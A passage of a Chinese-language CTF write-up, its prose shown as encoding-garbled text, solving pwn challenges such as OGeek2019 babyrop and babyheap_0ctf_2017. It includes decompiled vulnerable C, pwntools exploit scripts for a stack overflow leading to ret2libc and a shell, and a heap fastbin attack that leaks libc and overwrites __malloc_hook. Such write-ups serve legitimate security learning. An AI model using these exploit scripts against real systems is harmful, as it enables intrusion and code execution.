</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number.</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span> <span class=n>cat_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_en_2 class="relative group">ciscn_2019_en_2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_en_2 aria-label=é”šç‚¹>#</a></span></h3><p>å’Œä¸Šä¸Šé¢˜ä¸€æ ·ã€‚</p><h2 id=part-ii class="relative group">Part II <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#part-ii aria-label=é”šç‚¹>#</a></span></h2><h3 id=ogeek2019babyrop class="relative group">[OGeek2019]babyrop <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ogeek2019babyrop aria-label=é”šç‚¹>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+Bh] [ebp-Dh]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>sub_80486BB</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd</span><span class=o>&gt;</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>sub_804871F</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sub_80487D0</span><span class=p>(</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>main</code> ä¸­ <code>sub_80486BB</code> ç”¨äºåˆå§‹åŒ–ï¼Œç„¶åå°†ä¸€ä¸ªéšæœºæ•°ä¼ å…¥ <code>sub_804871F</code>ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_804871F</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-4Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+2Ch] [ebp-2Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+33h] [ebp-25h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>ssize_t</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+4Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=s>&#34;%ld&#34;</span><span class=p>,</span> <span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>buf</span><span class=p>[</span><span class=n>v6</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=n>v1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s>&#34;Correct</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>è¿™é‡Œçš„ <code>a1</code> å°±æ˜¯ä¼ å…¥çš„éšæœºæ•°ï¼Œç„¶åè¦æ±‚æˆ‘ä»¬çš„è¾“å…¥å’Œéšæœºæ•°ç»è¿‡ <code>strncmp</code> æ¯”è¾ƒåå®Œå…¨ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ <code>\x00</code> ä½¿å¾— <code>strlen</code> å‡½æ•°è¿”å› 0ï¼Œä»è€Œä½¿å¾— <code>strncmp</code> å‡½æ•°åªæ¯”è¾ƒ 0 ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±èƒ½ç»•è¿‡è¿™é‡Œçš„ <code>exit(0)</code>ï¼Œå¹¶è¿”å› <code>v5</code>ã€‚æ³¨æ„åˆ°è¿™é‡Œçš„è¿”å›å€¼ <code>v5</code> åœ¨ <code>ebp-0x25</code>ï¼Œè·ç¦»æˆ‘ä»¬èƒ½æ§åˆ¶çš„ä½äº <code>ebp-0x2c</code> çš„å˜é‡ <code>buf</code> ç›¸å·® <code>0x7</code>ï¼Œå°äºè¿™é‡Œ <code>read</code> çš„é•¿åº¦é™åˆ¶ <code>0x20</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ <code>v5</code> çš„å€¼ï¼Œä»è€Œæ§åˆ¶ <code>main</code> ä¸­çš„ <code>v2</code>ã€‚</p><p>éšåï¼Œ<code>v2</code> ä¼šè¢«ä¼ å…¥ <code>sub_80487D0</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=kr>__cdecl</span> <span class=nf>sub_80487D0</span><span class=p>(</span><span class=kt>char</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>ssize_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+11h] [ebp-E7h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a1</span> <span class=o>==</span> <span class=mi>127</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0xC8u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>a1</code> å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ <code>v2</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥å‘ <code>buf</code> å†™å…¥çš„æ•°æ®é•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›å®ƒå°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯ç­‰äº <code>0xff</code>ã€‚é‚£ä¹ˆåœ¨ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å°±éœ€è¦ä»¤ <code>v5</code> ä¸º <code>0xff</code>ï¼Œç»“åˆä¸Šé¢çš„ç»•è¿‡ï¼Œå¯ä»¥è¾“å…¥ <code>'\x00' + 6*'a' + '\xff'</code> æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚æœ€å <code>ret2libc</code> å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>send1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\xff</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Correct</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=mh>0x8048825</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xe7</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=n>main</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>],</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xe7</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=babyheap_0ctf_2017 class="relative group">babyheap_0ctf_2017 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#babyheap_0ctf_2017 aria-label=é”šç‚¹>#</a></span></h3><pre tabindex=0><code>===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
</code></pre><p>åˆ†é…å†…å­˜ä½¿ç”¨äº† <code>calloc</code>ï¼Œæ¯æ¬¡åˆ†é…ä¼šå…ˆæ¸…ç©ºä¸€ä¸‹è¿™å—å†…å­˜ï¼Œå¤§å°é™åˆ¶æ˜¯ 4096Bã€‚å¡«å……æ—¶ç›´æ¥è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚é™¤äº† canary å¤–ä¿æŠ¤å…¨å¼€ï¼Œå› æ­¤è€ƒè™‘æ³„éœ² libcã€‚å¦‚ä½•æ³„éœ²ï¼Ÿ</p><p>å½“åªæœ‰ä¸€ä¸ª small bin/large bin è¢«é‡Šæ”¾æ—¶ï¼Œå…¶ <code>fd</code> ä¸ <code>bk</code> æŒ‡å‘ <code>main_arena</code> ä¸­çš„åœ°å€ï¼Œè€Œåè€…æ˜¯ libc çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å®ƒæ³„éœ²å‡º libc åŸºå€ã€‚</p><p>é¦–å…ˆåˆ†é… 4 ä¸ª fast chunk å’Œ 1 ä¸ª small chunkï¼ˆä¸å¦¨åˆ†åˆ«ç§°ä¸º <code>a,b,c,d,e</code>ï¼‰ï¼Œç„¶åé‡Šæ”¾ <code>b</code>ï¼Œå®ƒå°†è¢«åŠ å…¥ fast bin é¡¶éƒ¨ã€‚æ­¤æ—¶å†é‡Šæ”¾ <code>c</code>ï¼Œé‚£ä¹ˆ <code>c</code> ä¹Ÿä¼šåŠ å…¥ fast bin é¡¶éƒ¨ï¼Œå¹¶ä¸”å®ƒçš„ <code>fd</code> æŒ‡å‘ <code>b</code>ã€‚æ­¤æ—¶æœ‰ï¼š<code>freelist->c->b</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># a0,b1,c2,d3</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># e4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># b</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># c</span>
</span></span></code></pre></div><p>è¿™æ ·å°±å¯ä»¥è¿›è¡Œ fastbin attackã€‚åˆ©ç”¨ <code>Fill</code> å †æº¢å‡ºä¿®æ”¹ <code>c</code> çš„ <code>fd</code> ä¸º <code>e</code> çš„åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä»æœªè¢«é‡Šæ”¾çš„ <code>a</code> å¼€å§‹å¡«å……ï¼Œæ‰€ä»¥åˆšæ‰ä¸æ˜¯ä» <code>a</code> å¼€å§‹é‡Šæ”¾ï¼‰ï¼Œéšåç¬¬ä¸€æ¬¡ <code>Allocate</code> æ‹¿åˆ° <code>c</code>ï¼Œç¬¬äºŒæ¬¡ <code>Allocate</code> å°±èƒ½æ‹¿åˆ° <code>e</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># c-&gt;fd = e</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x80</span><span class=s1>&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>æ³¨æ„è¿™é‡Œ payload çš„å‰ä¸‰ä¸ª <code>0</code> ç”¨äºå¡«å…… <code>a</code> ä¸­ <code>0x10</code> å­—èŠ‚çš„ç”¨æˆ·æ•°æ®å’Œ <code>b</code> ä¸­ <code>0x8</code> å­—èŠ‚çš„ <code>prev_size</code> å­—æ®µï¼Œåé¢åŒç†ã€‚<code>0x21</code> æ˜¯ <code>a/b/c/d</code> çš„ <code>chunk_size</code>ï¼Œ<code>0x80</code> æ˜¯ <code>e</code> çš„åœ°å€ä½ 8 ä½ï¼Œéƒ½å¯ä»¥é€šè¿‡ gdb è°ƒè¯•å¾—åˆ°ã€‚</p><blockquote><p>æ³¨ï¼š<code>0x21</code> ä½ä½çš„ <code>1</code> è¡¨ç¤º <code>PREV_INUSE</code>ï¼Œè¿™å’Œ fast bin ä¸­ chunk çš„ P ä½ä¸å˜æ˜¯ä¸€è‡´çš„ã€‚</p></blockquote><p>ç„¶è€Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®‰å…¨æ£€æŸ¥ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define fastbin_index(sz) \
</span></span></span><span class=line><span class=cl><span class=cp>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>fastbin_index</span> <span class=p>(</span><span class=nf>chunksize</span> <span class=p>(</span><span class=n>victim</span><span class=p>))</span> <span class=o>!=</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;malloc(): memory corruption (fast)&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>errout</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=n>errstr</span><span class=p>,</span> <span class=nf>chunk2mem</span> <span class=p>(</span><span class=n>victim</span><span class=p>),</span> <span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>æ£€æŸ¥æˆ‘ä»¬æ‹¿åˆ°çš„ chunk çš„å¤§å°æ˜¯å¦åœ¨å¯¹åº”ç´¢å¼•çš„ fast bin èŒƒå›´å†…ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>e</code> çš„ <code>chunk_size</code> å­—æ®µï¼Œæ–¹æ³•åŒæ ·æ˜¯å †æº¢å‡ºã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x21</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>è¿™é‡Œé€šè¿‡ <code>d</code> æº¢å‡ºåˆ° <code>e</code> çš„ <code>chunk_size</code> å¹¶è¦†ç›–ä¸Šäº† <code>0x21</code>ï¼Œgdb è°ƒè¯•å¾—åˆ°å…¶ç´¢å¼•ä¸º <code>2</code>ã€‚</p><p>ä¿®æ”¹å®Œæˆåæ‰å¯ä»¥è¿›è¡Œä¸¤æ¬¡ <code>alloc(0x10)</code> ä»è€Œæ‹¿åˆ° <code>e</code>ã€‚æ‹¿åˆ° <code>e</code> åå†é‡Šæ”¾æ‰å®ƒå°±å¯ä»¥è·å¾—å…¶ <code>fd</code> ä¸ <code>bk</code>ï¼Œä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>å‰é¢å¯¹å…¶ <code>chunk_size</code> çš„ä¿®æ”¹ä¼šå¯¼è‡´é‡Šæ”¾æ—¶ <code>e</code> è¿›å…¥ fast binï¼Œæ‹¿ä¸åˆ° <code>fd</code> å’Œ <code>bk</code>ã€‚</li><li><code>e</code> è¢«é‡Šæ”¾åä¸ top chunk ç›¸é‚»ï¼Œå¿…å®šä¼šè¢«åˆå¹¶ã€‚</li><li><code>fd</code> å’Œ <code>bk</code> åˆ°åº•æŒ‡å‘å“ªé‡Œï¼Ÿ</li></ol><p>è§£ç­”ï¼š</p><ol><li>æŠŠ <code>e</code> çš„ <code>chunk_size</code> æ¢å¤å³å¯ã€‚</li><li>é‡Šæ”¾ <code>e</code> å‰å†å¤šç”³è¯·ä¸€ä¸ª small chunk ä½¿å¾— <code>e</code> ä¸ä¸ top chunk ç›¸é‚»ã€‚</li><li><code>e</code> è¢«é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œæ‰€ä»¥å…¶ <code>fd</code> ä¸ <code>bk</code> éƒ½æŒ‡å‘ unsorted bin çš„é“¾è¡¨å¤´ï¼Œæ³¨æ„å…¶åœ°å€åˆ° libc åŸºå€çš„åç§»æ˜¯å›ºå®šçš„ <code>0x3c4b78</code>ã€‚</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x91</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># f5</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># e, e-&gt;fd = unsorted_head</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)[:</span><span class=mi>8</span><span class=p>])</span><span class=o>-</span><span class=mh>0x3c4b78</span>
</span></span></code></pre></div><p>æœ€åçš„ <code>dump(2)</code> å°±æ˜¯æ‰“å°ç´¢å¼•ä¸º <code>2</code> çš„ chunkï¼Œä¹Ÿå°±æ˜¯ <code>e</code>ï¼Œä»è€Œå¾—åˆ° <code>e</code> çš„ <code>fd</code> å’Œ <code>bk</code>ã€‚</p><p>ä¹‹åï¼Œå†æ¬¡ä½¿ç”¨ fast bin attack å°† libc ä¸­å‡½æ•°ï¼Œä¾‹å¦‚ <code>__malloc_hook</code> æ”¾å…¥ fast binï¼Œç„¶åç”¨ <code>malloc</code> è¿”å›ç»™æˆ‘ä»¬ï¼Œå°±å¯ä»¥å®ç°ç±»ä¼¼ GOT åŠ«æŒçš„æ•ˆæœã€‚<code>__malloc_hook</code> åªè¦éç©ºï¼Œå°±ä¼šåœ¨ <code>malloc</code> æ—¶è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬è®©å®ƒæŒ‡å‘ <code>one_gadget</code> æ‰¾åˆ°çš„ä¸€ä¸ª gadget å³å¯ï¼Œæ¯”å¦‚å¯ä»¥ç”¨è·ç¦» libc åŸºå€ 0x4526a çš„ gadgetã€‚</p><p>ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸Šé¢çš„å®‰å…¨æ£€æŸ¥ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¯¥æ£€æŸ¥å¯¹äºå¯¹é½æ²¡æœ‰ä»»ä½•è¦æ±‚ã€‚é€šè¿‡ gdb è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨ <code>__malloc_hook</code> é™„è¿‘çš„ <code>_IO_wide_data_0+304</code> ä½ç½®å…¶é«˜ä½å­—èŠ‚ä¸º <code>7f</code> è€Œä½ä½å­—èŠ‚å«æœ‰è¿ç»­çš„ <code>00</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¢åŠ ä¸€äº›åç§»è·å¾— <code>0x7f</code> è¿™ä¸ªæ•°å€¼ä½œä¸º <code>chunk_size</code>ï¼Œæ°å¥½èƒ½é€šè¿‡æ£€æŸ¥ã€‚</p><p>å¦‚ä¸‹ï¼š</p><pre tabindex=0><code>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40
0x7f16d95deae0 &lt;_IO_wide_data_0+288&gt;:    0x0000000000000000    0x0000000000000000
0x7f16d95deaf0 &lt;_IO_wide_data_0+304&gt;:    0x00007f16d95dd260    0x0000000000000000
0x7f16d95deb00 &lt;__memalign_hook&gt;:    0x00007f16d929fe20    0x00007f16d929fa00
0x7f16d95deb10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x0000000000000000
</code></pre><p>æˆ‘ä»¬åŠ  13 å­—èŠ‚åç§»ï¼ˆå¾ªç¯å³ç§»ï¼‰ï¼ŒæˆåŠŸä¼ªé€  <code>chunk_size</code>ï¼š</p><pre tabindex=0><code>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40+0xd
0x7f16d95deaed &lt;_IO_wide_data_0+301&gt;:    0x16d95dd260000000    0x000000000000007f
0x7f16d95deafd:    0x16d929fe20000000    0x16d929fa0000007f
0x7f16d95deb0d &lt;__realloc_hook+5&gt;:    0x000000000000007f    0x0000000000000000
0x7f16d95deb1d:    0x0000000000000000    0x0000000000000000
